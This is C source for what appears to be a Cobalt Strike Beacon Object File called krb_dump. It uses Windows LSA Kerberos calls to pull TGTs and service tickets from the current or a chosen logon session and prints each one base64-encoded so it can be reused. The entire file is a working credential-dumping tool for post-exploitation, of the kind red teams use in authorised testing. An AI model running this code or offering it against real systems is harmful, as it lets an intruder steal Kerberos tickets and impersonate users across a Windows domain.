/*
 * krb_dump - Extract TGTs and service tickets from logon sessions
 *
 * Usage: krb_dump [/luid:LOGONID] [/user:USER] [/service:SERVICE] [/client:CLIENT]
 *
 * Note: Requires elevation to dump tickets from other sessions
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#include <ntsecapi.h>

#define KerbQueryTicketCacheMessage     1
#define KerbRetrieveEncodedTicketMessage 8

/* Dump tickets from a logon session */
static int dump_tickets(LUID* target_luid, const char* filter_service, formatp* output) {
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    NTSTATUS status;
    LSA_STRING kerbName;
    int dumped_count = 0;

    kerbName.Buffer = "Kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;

    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(output, "[-] LsaConnectUntrusted failed: 0x%08X\n", status);
        return 0;
    }

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        BeaconFormatPrintf(output, "[-] LsaLookupAuthenticationPackage failed: 0x%08X\n", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    /* First, query the ticket cache to get list of tickets */
    KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
    memset(&cacheRequest, 0, sizeof(cacheRequest));
    cacheRequest.MessageType = KerbQueryTicketCacheMessage;
    if (target_luid) {
        cacheRequest.LogonId = *target_luid;
    }

    PVOID cacheResponse = NULL;
    ULONG cacheResponseLen = 0;
    NTSTATUS subStatus;

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest,
                                                   sizeof(cacheRequest), &cacheResponse,
                                                   &cacheResponseLen, &subStatus);

    if (status != 0 || !cacheResponse) {
        BeaconFormatPrintf(output, "[-] Failed to query ticket cache: 0x%08X\n", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return 0;
    }

    PKERB_QUERY_TKT_CACHE_RESPONSE cache = (PKERB_QUERY_TKT_CACHE_RESPONSE)cacheResponse;
    BeaconFormatPrintf(output, "[*] Found %d tickets in cache\n\n", cache->CountOfTickets);

    /* For each ticket, retrieve the encoded version */
    for (ULONG i = 0; i < cache->CountOfTickets; i++) {
        KERB_TICKET_CACHE_INFO* ticketInfo = &cache->Tickets[i];

        /* Get server name for filtering/display */
        char server_name[512];
        MSVCRT$wcstombs(server_name, ticketInfo->ServerName.Buffer,
                       min(sizeof(server_name)-1, ticketInfo->ServerName.Length/2 + 1));
        server_name[ticketInfo->ServerName.Length/2] = '\0';

        /* Apply filter if specified */
        if (filter_service && !strstr(server_name, filter_service)) {
            continue;
        }

        BeaconFormatPrintf(output, "[*] Ticket %d: %s\n", i, server_name);

        /* Build retrieve request */
        size_t req_size = sizeof(KERB_RETRIEVE_TKT_REQUEST) + ticketInfo->ServerName.MaximumLength;
        PKERB_RETRIEVE_TKT_REQUEST retrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)calloc(1, req_size);

        if (retrieveRequest) {
            retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
            if (target_luid) {
                retrieveRequest->LogonId = *target_luid;
            }
            retrieveRequest->TargetName.Buffer = (PWSTR)((BYTE*)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
            retrieveRequest->TargetName.Length = ticketInfo->ServerName.Length;
            retrieveRequest->TargetName.MaximumLength = ticketInfo->ServerName.MaximumLength;
            memcpy(retrieveRequest->TargetName.Buffer, ticketInfo->ServerName.Buffer, ticketInfo->ServerName.Length);

            retrieveRequest->TicketFlags = 0;
            retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
            retrieveRequest->EncryptionType = ticketInfo->EncryptionType;

            PVOID retrieveResponse = NULL;
            ULONG retrieveResponseLen = 0;

            status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, retrieveRequest,
                                                          (ULONG)req_size, &retrieveResponse,
                                                          &retrieveResponseLen, &subStatus);

            if (status == 0 && retrieveResponse) {
                PKERB_RETRIEVE_TKT_RESPONSE resp = (PKERB_RETRIEVE_TKT_RESPONSE)retrieveResponse;

                if (resp->Ticket.EncodedTicketSize > 0) {
                    BYTE* ticketData = (BYTE*)resp->Ticket.EncodedTicket;
                    size_t ticketLen = resp->Ticket.EncodedTicketSize;

                    BeaconFormatPrintf(output, "    Encryption: %s\n", etype_string(ticketInfo->EncryptionType));
                    BeaconFormatPrintf(output, "    Ticket Size: %d bytes\n", (int)ticketLen);

                    /* Base64 encode the ticket */
                    size_t b64_len = ((ticketLen + 2) / 3) * 4 + 1;
                    char* b64 = (char*)malloc(b64_len);
                    if (b64) {
                        base64_encode(ticketData, ticketLen, b64);
                        BeaconFormatPrintf(output, "    Base64 Ticket:\n\n%s\n\n", b64);
                        free(b64);
                        dumped_count++;
                    }
                }

                SECUR32$LsaFreeReturnBuffer(retrieveResponse);
            } else {
                BeaconFormatPrintf(output, "    [-] Failed to retrieve ticket: 0x%08X / 0x%08X\n\n",
                                  status, subStatus);
            }

            free(retrieveRequest);
        }
    }

    SECUR32$LsaFreeReturnBuffer(cacheResponse);
    SECUR32$LsaDeregisterLogonProcess(hLsa);

    return dumped_count;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 128 * 1024);
    arg_init(&parser, args, alen);

    char* luid_str = arg_get(&parser, "luid");
    char* user = arg_get(&parser, "user");
    char* service = arg_get(&parser, "service");
    char* client = arg_get(&parser, "client");

    BeaconFormatPrintf(&output, "[*] Action: Dump Kerberos Tickets\n");

    LUID* target_luid = NULL;
    LUID luid_val;

    if (luid_str) {
        unsigned long long luid_int = 0;
        if (luid_str[0] == '0' && (luid_str[1] == 'x' || luid_str[1] == 'X')) {
            luid_int = strtol(luid_str + 2, NULL, 16);
        } else {
            luid_int = strtol(luid_str, NULL, 10);
        }
        luid_val.LowPart = (DWORD)luid_int;
        luid_val.HighPart = (LONG)(luid_int >> 32);
        target_luid = &luid_val;
        BeaconFormatPrintf(&output, "[*] Target LUID: 0x%08X:%08X\n", luid_val.HighPart, luid_val.LowPart);
    } else {
        BeaconFormatPrintf(&output, "[*] Dumping from current logon session\n");
    }

    if (service) BeaconFormatPrintf(&output, "[*] Filter by service: %s\n", service);

    BeaconFormatPrintf(&output, "\n");

    int count = dump_tickets(target_luid, service, &output);
    BeaconFormatPrintf(&output, "[*] Dumped %d tickets\n", count);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

    BeaconFormatFree(&output);
    if (luid_str) free(luid_str);
    if (user) free(user);
    if (service) free(service);
    if (client) free(client);
}
